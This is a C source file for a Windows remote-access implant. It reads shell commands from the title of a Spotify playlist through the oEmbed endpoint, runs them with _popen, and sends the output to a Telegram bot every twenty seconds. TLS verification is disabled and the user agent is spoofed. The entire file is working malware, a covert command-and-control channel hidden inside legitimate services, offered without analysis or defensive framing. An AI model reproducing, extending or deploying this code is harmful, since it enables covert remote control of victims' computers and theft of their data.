#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <curl/curl.h>

#define PLAYLIST_ID "YOUR_PLAYLIST_ID"
#define TELEGRAM_BOT_TOKEN "YOUR_BOT_TOKEN"
#define TELEGRAM_CHAT_ID "YOUR_CHAT_ID"
#define SLEEP_SECONDS 20

#pragma warning(disable: 4996)

struct MemoryData {
	char* data;      // Pointer to store the downloaded data
	size_t size;     // Size of Data
};

static size_t SaveData(void* contents, size_t size, size_t nmemb, void* userp) {
	size_t totalSize = size * nmemb;
	struct MemoryData* mem = (struct MemoryData*)userp;
	char* newData = (char*)realloc(mem->data, mem->size + totalSize + 1);
	if (newData == NULL) {
		return 0;  
	}
	mem->data = newData;
	memcpy(&(mem->data[mem->size]), contents, totalSize);
	mem->size += totalSize;
	mem->data[mem->size] = 0;  

	return totalSize;
}

char* GetCommandFromSpotify() {
	
	CURL* Curl; 
	struct MemoryData SpotifyCommand;
	char Url[512];

	SpotifyCommand.data = (char*)malloc(1);
	SpotifyCommand.size = 0;

	sprintf(Url, "https://open.spotify.com/oembed?url=https://open.spotify.com/playlist/%s&_=%d", PLAYLIST_ID, time(NULL));
	Curl = curl_easy_init();

	if (Curl == NULL) {
		free(SpotifyCommand.data);
		return NULL;
	}

	curl_easy_setopt(Curl, CURLOPT_URL,Url); // curl_easy_setopt is use to Set Configurations 
	curl_easy_setopt(Curl, CURLOPT_WRITEFUNCTION, SaveData);
	curl_easy_setopt(Curl, CURLOPT_WRITEDATA, (void*)&SpotifyCommand);
	curl_easy_setopt(Curl, CURLOPT_USERAGENT, "Mozilla/5.0");
	curl_easy_setopt(Curl, CURLOPT_FOLLOWLOCATION, 1L);
	curl_easy_setopt(Curl, CURLOPT_TIMEOUT, 30L);
	curl_easy_setopt(Curl, CURLOPT_SSL_VERIFYPEER, 0L);

	// This is the Actual Function to Make Request 
	CURLcode Res = curl_easy_perform(Curl);
	curl_easy_cleanup(Curl);

	if (Res != CURLE_OK || SpotifyCommand.size == 0) {
		free(SpotifyCommand.data);
		return NULL;
	}

	char* Title = strstr(SpotifyCommand.data, "\"title\":\"");
	if (Title == NULL) {
		free(SpotifyCommand.data);
		return NULL;
	}
	Title += 9; // This Will Move the Pointer 9 Char further Exact at our Command
	
	char* TitleEnd = strstr(Title, "\"");
	if (TitleEnd == NULL) {
		free(SpotifyCommand.data);
		return NULL;
	}

	int TitleLength = TitleEnd - Title;
	char* Command = (char*)malloc(TitleLength + 1);

	strncpy(Command, Title, TitleLength);
	Command[TitleLength] = '\0';

	free(SpotifyCommand.data);
	return Command;

}

char* RunCommand(const char* command)
{
	if (command == NULL || strlen(command) == 0) {
		return NULL;
	}

	FILE* pipe = _popen(command, "r");
	if (pipe == NULL)
		return NULL;

	char buffer[256];
	char* output = (char*)malloc(1);
	if (output == NULL)
	{
		_pclose(pipe);
		return NULL;
	}

	output[0] = '\0';
	size_t totalSize = 0;

	while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
		int len = strlen(buffer);
		totalSize += len;
		output = (char*)realloc(output, totalSize + 1);
		if (output == NULL) {
			_pclose(pipe);
			return _strdup("ERROR: Out of memory");
		}
		strcat(output, buffer);
	}

	_pclose(pipe);

	if (strlen(output) == 0) {
		free(output);
		return _strdup("Command Run But No Output was There");
	}

	return output;
}

char* URLEncode(const char* text) {
	if (text == NULL) return NULL;

	CURL* curl = curl_easy_init();
	if (curl == NULL) return NULL;

	char* encoded = curl_easy_escape(curl, text, 0);
	curl_easy_cleanup(curl);

	return encoded;
}

int SendToTelegram(const char* message, const char* CommandName) {

	if (message == NULL)
	{
		return 0;
	}
	char truncated[4096];
	if (strlen(message) > 4000) {
		strncpy(truncated, message, 3996);
		truncated[3996] = '\0';
		strcat(truncated, "... [TRUNCATED]");
	}
	else {
		strcpy(truncated, message);
	}

	char* encodedMessage = URLEncode(truncated);
	if (encodedMessage == NULL) return 0;

	char url[8192];
	sprintf(url,
		"https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=[%s]%%0A%%0A%s",
		TELEGRAM_BOT_TOKEN,
		TELEGRAM_CHAT_ID,
		CommandName ? CommandName : "Unknown",
		encodedMessage
	);


	free(encodedMessage);

	CURL* curl = curl_easy_init();
	if (curl == NULL) return 0;

	struct MemoryData response;
	response.data = (char*)malloc(1);
	response.size = 0;

	curl_easy_setopt(curl, CURLOPT_URL, url);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, SaveData);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&response);
	curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
	curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

	CURLcode res = curl_easy_perform(curl);
	curl_easy_cleanup(curl);


	if (res != CURLE_OK) {
		free(response.data);
		return 0;
	}
	int success = (strstr(response.data, "\"ok\":true") != NULL);
	free(response.data);

	return success;

}

int main() {
	
	// This Line will Use to Initialize LibCurl Library (Memory Management,SSL/TLS Lib, Network Lib and Other Needed Things)
	curl_global_init(CURL_GLOBAL_ALL); // Basically Required To Setup Our Environment
	printf("Playlist ID : %s \n", PLAYLIST_ID);

	char* LastCommand = NULL;  // Last Command History

	while (1) {
		char* Command = GetCommandFromSpotify();
		if (Command == NULL) {
			printf("[-] Could not get command, waiting...\n");
			Sleep(SLEEP_SECONDS * 1000);
			continue;
		}

		printf("[+] Command: %s\n", Command);

		if (LastCommand != NULL && strcmp(LastCommand, Command) == 0) {
			printf("[*] Command hasn't changed, skipping...\n");
			free(Command);
			Sleep(SLEEP_SECONDS * 1000);
			continue;
		}

		printf("[+] Running command...\n");
		char* output = RunCommand(Command);

		if (output != NULL) {

			printf("[+] Sending output to Telegram...\n");
			if (SendToTelegram(output, Command)) {
				printf("[+] Output sent successfully!\n");
			}
			else {
				printf("[-] Failed to send output to Telegram\n");
			}
			if (LastCommand != NULL)
			{
				free(LastCommand);
			}
			LastCommand = Command;
			Command = NULL;
			free(output);
		}
		else {
			printf("[-] Command produced no output\n");
			if (LastCommand != NULL) free(LastCommand);
			LastCommand = Command;
			Command = NULL;
		}

		printf("[+] Sleep For %d Seconds...\n\n", SLEEP_SECONDS);
		Sleep(SLEEP_SECONDS * 1000);

	}

	curl_global_cleanup();
	return 0;
}
